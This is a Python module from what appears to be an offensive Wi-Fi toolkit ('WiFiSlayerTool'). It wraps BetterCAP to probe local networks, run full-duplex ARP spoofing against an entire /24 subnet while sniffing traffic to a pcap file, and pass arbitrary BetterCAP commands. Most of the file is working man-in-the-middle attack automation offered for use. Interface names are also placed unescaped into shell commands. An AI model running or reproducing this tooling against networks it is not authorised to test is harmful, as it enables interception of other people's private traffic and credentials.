# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Traffic Analysis Module
Network traffic analysis and MITM using BetterCAP.
"""

import os
import subprocess
from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, print_sub_menu,
    confirm_action,
)
from core.validator import safe_input, validate_ip
from core.network import get_wireless_interfaces
from core.ascii_art import print_eye_art
from config import get_text, CAPS_DIR


def traffic_menu(current_interface=None):
    """Traffic analysis sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "📡", "فحص أجهزة الشبكة (Probe)"),
                ("2", "🕵️", "التنصت + ARP Spoof"),
                ("3", "🛠️", "BetterCAP مخصص"),
            ]
        else:
            options = [
                ("1", "📡", "Probe Network Devices"),
                ("2", "🕵️", "Sniff Traffic (ARP Spoof)"),
                ("3", "🛠️", "Custom BetterCAP"),
            ]
        print_sub_menu("📡 " + get_text("menu_traffic"), options)
        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()
        if choice == "1":
            probe_network(current_interface)
        elif choice == "2":
            sniff_traffic(current_interface)
        elif choice == "3":
            custom_bettercap(current_interface)
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def _get_interface(current):
    if current:
        return current
    interfaces = get_wireless_interfaces()
    iface = select_interface(interfaces)
    if not iface:
        print_error("No interface selected")
    return iface


def probe_network(interface=None):
    interface = _get_interface(interface)
    if not interface:
        return
    caplet = os.path.join(CAPS_DIR, "probe.cap")
    log.info(f"Probe on {interface}")
    print_info(f"Probing on [bold]{interface}[/] ... (type exit to return)")
    console.print()
    try:
        if os.path.exists(caplet):
            os.system(f"sudo bettercap -iface {interface} -caplet '{caplet}'")
        else:
            os.system(f"sudo bettercap -iface {interface} -eval 'net.probe on'")
    except KeyboardInterrupt:
        print_info("Stopped")


def sniff_traffic(interface=None):
    interface = _get_interface(interface)
    if not interface:
        return
    os.system("clear" if os.name != "nt" else "cls")
    print_eye_art()
    router_ip = safe_input(get_text("enter_ip"), validate_ip, console)
    if not router_ip:
        return
    console.print()
    print_warning(f"Target: [bold]{router_ip}/24[/] on [bold]{interface}[/]")
    if not confirm_action(get_text("confirm_attack")):
        print_info(get_text("attack_cancelled"))
        return
    cmds = (f"net.probe on; set arp.spoof.fullduplex true; "
            f"set arp.spoof.targets {router_ip}/24; arp.spoof on; "
            f"set net.sniff.local true; net.sniff on; "
            f"set net.sniff.output pcap_output.pcap")
    log.info(f"Sniffing {router_ip}/24 on {interface}")
    print_info("Starting sniff session ... (type exit to return)")
    console.print()
    try:
        os.system(f"sudo bettercap -iface {interface} -eval '{cmds}'")
    except KeyboardInterrupt:
        print_info("Stopped")


def custom_bettercap(interface=None):
    interface = _get_interface(interface)
    if not interface:
        return
    cmd = safe_input("BetterCAP eval command", console=console)
    if not cmd:
        return
    log.info(f"Custom BetterCAP: {cmd} on {interface}")
    try:
        subprocess.run(["sudo", "bettercap", "-iface", interface, "-eval", cmd])
    except KeyboardInterrupt:
        print_info("Stopped")
